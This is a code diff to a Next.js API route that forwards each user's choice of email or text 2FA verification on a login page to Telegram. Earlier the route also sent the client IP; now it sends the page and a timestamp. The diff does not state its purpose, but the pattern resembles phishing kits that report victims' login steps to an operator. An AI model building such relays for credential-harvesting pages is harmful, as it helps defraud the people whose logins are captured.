@@ -1,17 +1,18 @@
 import { NextRequest, NextResponse } from "next/server"
-import { telegramService } from "@/lib/telegram"
-import { getClientIp } from "@/lib/request-ip"
+import { sendFormNotification } from "@/lib/telegram"
 
 export async function POST(request: NextRequest) {
   try {
-    const { verificationType } = await request.json()
-    const ip = getClientIp(request)
-    await telegramService.sendVerificationClickNotification(verificationType, ip)
-    return NextResponse.json({ success: true })
+    const { method, page } = await request.json()
+    const isEmail = method === "email"
+    const telegramSuccess = await sendFormNotification({
+      type: isEmail ? "email_verification" : "text_verification",
+      page: page || `/login/2fa-verify?method=${method}`,
+      timestamp: new Date().toISOString(),
+    })
+    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
   } catch (error) {
     console.error("Error sending verification click notification:", error)
     return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
   }
 }
-
-
